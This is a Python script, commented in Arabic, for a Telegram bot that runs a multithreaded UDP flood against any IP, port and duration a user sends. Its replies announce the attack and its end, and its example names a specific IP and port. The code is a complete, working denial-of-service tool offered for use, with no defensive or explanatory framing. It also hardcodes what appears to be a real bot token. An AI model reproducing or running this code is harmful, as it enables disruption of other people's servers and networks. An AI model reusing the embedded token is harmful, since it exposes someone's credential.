
import socket
import time
import random
import threading
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters

# توكن البوت
TOKEN = "7313070525:AAFbW4oRuXl1X5IPhRRY5Qr6rwKY8hwDBsc"

# دالة تنفيذ الهجوم لكل Thread
def udp_attack(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    while time.time() < timeout:
        try:
            sock.sendto(data, (ip, port))
        except:
            pass
    sock.close()

# دالة الهجوم متعدد السلاسل (قوي)
def threaded_attack(ip, port, duration, threads=10):
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=udp_attack, args=(ip, port, duration))
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()

# استقبال أمر /start
def start(update, context):
    update.message.reply_text("أرسل:\n<IP> <PORT> <DURATION>\nمثال:\n80.238.137.35 17979 3600")

# استقبال الطلبات
def handle_message(update, context):
    try:
        msg = update.message.text.strip()
        ip, port, duration = msg.split()
        port = int(port)
        duration = int(duration)

        update.message.reply_text(f"بدء الهجوم على {ip}:{port} لمدة {duration} ثانية...\n(10 threads تعمل الآن)")

        # تنفيذ الهجوم
        threaded_attack(ip, port, duration, threads=10)

        update.message.reply_text("✅ تم انتهاء الهجوم.")
        update.message.reply_text("تم التنظيف. جاهز لهجوم جديد.")

    except Exception as e:
        update.message.reply_text(f"حدث خطأ: {str(e)}")

# تشغيل البوت
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
